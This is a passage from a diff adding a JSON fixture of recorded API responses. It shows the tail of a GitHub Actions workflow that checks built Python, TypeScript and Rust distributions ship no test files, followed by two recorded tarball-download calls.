${{ needs.detect.outputs.e2e_extra_scope }}\n          EXCLUDE: ${{ needs.detect.outputs.e2e_exclude }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        # `$EXTRA_SCOPE` / `$EXCLUDE` are deliberately unquoted: empty expands to nothing, and a\n        # rendered value word-splits into the repeated flags.\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} e2e verify \"$PACKAGE_ROOT\" --scope \"$SCAN_PATH\" --base \"$BASE\" $EXTRA_SCOPE $EXCLUDE\n\n  packaging:\n    name: Packaging (no test files in the built artifact)\n    needs: detect\n    if: ${{ (inputs.gates == '' || contains(inputs.gates, '\"packaging\"')) && (inputs.packaging_artifact != '' || needs.detect.outputs.packaging_build != '' || needs.detect.outputs.packaging_dist == 'true') }}\n    runs-on: ubuntu-latest\n    steps:\n      # Checkout must precede the artifact download: actions/checkout deletes the workspace's\n      # existing contents before initializing, so downloading first would wipe the artifact.\n      - name: Check out the repository to build/inspect its distribution, or just to resolve the hermetic-cli download action\n        if: inputs.packaging_artifact == '' || needs.detect.outputs.cli_command != ''\n        uses: actions/checkout@v6\n      - name: Download the uploaded distributions\n        if: inputs.packaging_artifact != ''\n        uses: actions/download-artifact@v8\n        with:\n          name: ${{ inputs.packaging_artifact }}\n          path: _packaging_artifact\n      - name: Download the CLI built from HEAD (hermetic)\n        if: needs.detect.outputs.cli_command != ''\n        uses: ./.github/actions/download-hermetic-cli\n      # cargo must be on PATH first: `cargo package` needs it, and `uv build`/`prepack` may compile a Rust core.\n      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_build != '' && (needs.detect.outputs.packaging_language == 'rust' || inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true') }}\n        uses: dtolnay/rust-toolchain@stable\n      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_build != '' && (needs.detect.outputs.packaging_language == 'rust' || inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true') }}\n        name: Cache the Rust build (cargo registry + target)\n        uses: actions/cache@v4\n        with:\n          path: |\n            ~/.cargo/registry\n            ~/.cargo/git\n            ${{ needs.detect.outputs.cargo_target_dir || format('{0}/target', needs.detect.outputs.package_root) }}\n          key: rust-toolchain-build-${{ runner.os }}-${{ hashFiles('**/Cargo.lock') }}\n          restore-keys: |\n            rust-toolchain-build-${{ runner.os }}-\n      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_language == 'python' }}\n        uses: astral-sh/setup-uv@v7\n        with:\n          enable-cache: true\n      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_language == 'typescript' && (needs.detect.outputs.ts_package_manager || 'pnpm') == 'pnpm' }}\n        uses: pnpm/action-setup@v5\n        with:\n          version: ${{ needs.detect.outputs.ts_pnpm_version || '>=11' }}\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_build != '' && needs.detect.outputs.packaging_language == 'typescript' }}\n        name: Install project dependencies\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          PM: ${{ needs.detect.outputs.ts_package_manager || 'pnpm' }}\n        run: |\n          set -euo pipefail\n          if [ \"$PM\" = \"pnpm\" ]; then pnpm install --frozen-lockfile; else npm ci; fi\n      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_build != '' && needs.detect.outputs.build_command != '' }}\n        name: Run the build step (build_command)\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          BUILD_COMMAND: ${{ needs.detect.outputs.build_command }}\n        run: |\n          set -euo pipefail\n          eval \"$BUILD_COMMAND\"\n      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_build != '' }}\n        name: Build the distribution (packaging_build)\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          PACKAGING_BUILD: ${{ needs.detect.outputs.packaging_build }}\n        run: |\n          set -euo pipefail\n          eval \"$PACKAGING_BUILD\"\n      - name: Check the built distributions ship no test files\n        env:\n          VERSION: ${{ inputs.version }}\n          PACKAGING_ARTIFACT: ${{ inputs.packaging_artifact }}\n          PACKAGE_ROOT: ${{ needs.detect.outputs.package_root }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: |\n          set -euo pipefail\n          # nullglob: an unmatched glob expands to nothing, not the literal; globstar: `**` recurses.\n          shopt -s nullglob globstar\n          pkg=\"${PACKAGE_ROOT:-.}\"\n          if [ -n \"$PACKAGING_ARTIFACT\" ]; then dist_root=_packaging_artifact; crate_root=_packaging_artifact; else dist_root=\"$pkg/dist\"; crate_root=\"$pkg/target/package\"; fi\n          checked=0\n          check () {\n            local lang=\"$1\"; shift\n            for dist in \"$@\"; do\n              echo \"::group::packaging --language $lang $dist\"\n              ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} packaging \"$dist\" --language \"$lang\"\n              echo \"::endgroup::\"\n              checked=$((checked + 1))\n            done\n          }\n          check python \"$dist_root\"/**/*.whl \"$dist_root\"/**/*.tar.gz\n          check typescript \"$dist_root\"/**/*.tgz\n          check rust \"$crate_root\"/**/*.crate\n          if [ \"$checked\" -eq 0 ]; then\n            echo \"::error::no recognized built distribution (.whl / .tar.gz / .tgz / .crate) found in '$dist_root' or '$crate_root'\"\n            exit 1\n          fi\n          echo \"checked $checked built distribution(s); no test files shipped\"\n"
+  },
+  {
+    "method": "downloadTarball",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "pr-monitor",
+      "ref": "b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4"
+    },
+    "result": {
+      "$binary": "tarball-0.bin"
+    }
+  },
+  {
+    "method": "downloadTarball",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "testing-conventions",
+      "ref": "b3d3556b377c69f594826502c524966f9b0c6f60"
+    },
+    "result": {
+      "$binary": "tarball-1.bin"
+    }
+  }
+]
